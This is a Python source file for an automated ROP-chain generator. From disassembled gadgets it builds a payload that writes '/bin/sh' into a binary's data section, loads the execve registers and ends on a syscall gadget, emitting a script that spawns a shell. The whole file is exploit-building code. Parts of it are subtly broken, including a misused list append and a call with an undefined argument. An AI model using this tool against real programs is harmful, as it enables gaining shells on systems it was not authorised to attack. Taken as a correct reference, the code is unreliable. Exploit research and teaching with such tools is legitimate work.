import struct
import sys
import re

REGISTERS = [   "rax", "rbx", "rcx", "rdx", "rdi", "rsi", "rbp", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
            ]

def operands(csinsn):
    return csinsn.op_str.split(', ')

# Padding in qwords
# Returns a pair (int, [register]) that tells how many qwords on the stack the series of
# instructions consumes, and what registers it clobbers
def getPaddingAndClobbers(insns):
    pad = 0
    regs = []
    for insn in insns:
        ops = operands(insn)
        if insn.mnemonic == 'pop':
            regs.append(ops[0])
            pad += 1
        elif insn.mnemonic == 'ret':
            raise Exception('ret in interior of gadget.')
        elif len(ops) > 0:
            if ops[0] in REGISTERS:
                regs.append[ops[0]]
    return (pad, regs)

def writeGadget(gadget):
    return "payload += struct.pack('<Q', " + hex(int(gadget[0].address)) + ")\t\t# " + str(gadget) + "\n\t"

def writePadding(n):
    acc = ''
    for _ in range(n):
        acc += "payload += struct.pack('<Q', 0xdeadbeef)\t\t# Padding\n\t"
    return acc

# Find all gadgets that begin with a pop into reg.
# They also ought to end in ret.
def getPopGadgets(gadgetList, reg):
    acc = []
    for g in gadgetList:
        if g[0].mnemonic == 'pop' and operands(g[0])[0] == reg and g[-1].mnemonic == 'ret':
            acc.append(g)
    acc.sort(key=len) # Prefer gadgets with fewer pops -- less padding, less clobbering
    return acc

def makeLoadConstIntoRegSeq(gadgetList, reg, noClobber):
    regList = getPopGadgets(gadgetList, reg)
    # Search for "pop Reg; ret"
    for gadget in regList:
        (padding, clobbers) = getPaddingAndClobbers(gadget[1:-1])
        if any([x in noClobber for x in clobbers]):
            continue
        # "pop Reg; . . . ; ret" is found
        def loadConstIntoReg(const, comment = ''):
            # Write our output code:
            # Write address of "pop Reg; ret"
            ret = writeGadget(gadget)
            # Write const onto stack
            ret += "payload += struct.pack('<Q', " + hex(const) + ")"
            if comment:
                ret += '\t\t# ' + comment
            ret += "\n\t"
            # Pad additional pops
            ret += writePadding(padding)
            return ret
        return loadConstIntoReg

    raise Exception("Unable to find necessary gadgets to load a value into register " + reg)

def LoadConstIntoReg(gadgetList, reg, noClobber, const): return makeLoadConstIntoRegSeq(gadgetList, reg, noClobber)(const)

def getMovQwordGadgets(gadgets):
    movQwordGadgets = list()
    
    for gadget in gadgets:
        if len(gadget) == 2 and gadget[0].mnemonic == 'mov' and gadget[-1].mnemonic == 'ret':
                ops = operands(gadget[0])
                if re.search("^qword ptr \\[[a-z]+\\]$", ops[0]) and ops[1] in REGISTERS:
                    movQwordGadgets.append(gadget)
    
    return movQwordGadgets

def makeQwordLoadSeq(gadgetList):
    movQwordGadgets = getMovQwordGadgets(gadgetList)
    for g in movQwordGadgets:
        ops = operands(g[0])
        dest = ops[0][-4:-1]
        src = ops[1]
        try:
            loadSrcSeq = makeLoadConstIntoRegSeq(gadgetList, src, [])
            loadDestSeq = makeLoadConstIntoRegSeq(gadgetList, dest, [src])
            return lambda qword, addr: loadSrcSeq(qword, str(struct.pack("<Q", qword))) + loadDestSeq(addr, "Location to write") + writeGadget(g)
        except Exception:
            pass
        try:
            loadDestSeq = makeLoadConstIntoRegSeq(gadgetList, dest, [], qword)
            loadSrcSeq = makeLoadConstIntoRegSeq(gadgetList, src, [dest], qword)
            return lambda qword, addr: loadDestSeq(addr, "Location to write") + loadSrcSeq(qword, str(struct.pack("<Q", qword))) + writeGadget(g)
        except Exception:
            continue 
    raise Exception("Could not combine gadgets to write to arbitary memory.") 

def WriteStuffIntoMemory(GadgetList, data, addr) : 
    writeFunc = makeQwordLoadSeq(GadgetList)
    acc = ''
    while len(data) > 0 :
        if len(data) <= 8:
            data_piece = data
            data = ''
        
        else : 
            data_piece = data[:8]
            data = data[8:]

        acc += writeFunc(int.from_bytes(data_piece, byteorder = 'little'), addr)
        addr += 8
    return acc

def checkIfSyscallPresent(GadgetList) : 

    syscallList = list()

    x = 0
    for gadget in GadgetList:
        if len(gadget) != 1: continue # We're only interested in bare syscall right now.
        inst = gadget[0]
        if inst.mnemonic == "syscall": 
            syscallList.append(gadget)
        
    
    return syscallList

header = '''#!/usr/bin/env python2
import struct

if __name__ == '__main__' :
\t# Enter the amount of junk required
\tpayload = ''
\t
\t'''

footer='''
\tfd = open('payload.txt', 'wb')
\tfd.write(payload)
\tfd.close()    
'''

def execveROPChain(GadgetList, elf): 

    print("\n\n-->Chaining to get a shell using execve system call")
    """ Get a section from the file, by name. Return None if no such
            section exists.
    """
    data_section_addr = elf.getWritableDataSegments()[0].offset_in_elf #TODO: Should be offset in loaded image
    execve_bin_sh(GadgetList, data_section_addr)
    sys.exit()

def execve_bin_sh(GadgetList, data_section_addr) : 

    # Open the file where the payload is written in the form of a python script
    fd = open("execveROPChain.py", "w")
    fd.write(header)
    
    # Step-2: Writing "/bin/sh\x00" into .data section
    binsh = b'/bin/sh\x00' # TODO: Eliminate this null byte
    fd.write(WriteStuffIntoMemory(GadgetList, binsh, data_section_addr))


    # TODO: Make a LoadSmallCosntIntoReg that loads constants smaller than 256.
    # We need to prevent null bytes if possible.

    # Step-1: rax <- 59
    fd.write(LoadConstIntoReg(GadgetList, "rax", [], 59))

	# Step-2: rdi <- "Address of /bin//sh" - .data section's address
    fd.write(LoadConstIntoReg(GadgetList, "rdi", ["rax"], data_section_addr))

	# Step-3: rsi <- 0
    fd.write(LoadConstIntoReg(GadgetList, "rsi", ["rax", "rdi"], 0))

    # Step-4: rdx <- 0
    fd.write(LoadConstIntoReg(GadgetList, "rdx", ["rax", "rdi", "rsi"], 0))


    # Get syscall
    syscallList = checkIfSyscallPresent(GadgetList)
    if len(syscallList) == 0: 
        raise Exception("No syscall gadget found.")
    
    fd.write(writeGadget(syscallList[0]))
    fd.write(footer)
    fd.close()
    print("-->Written the complete payload in execveROPChain.py")
    print("-->Chaining successful!")
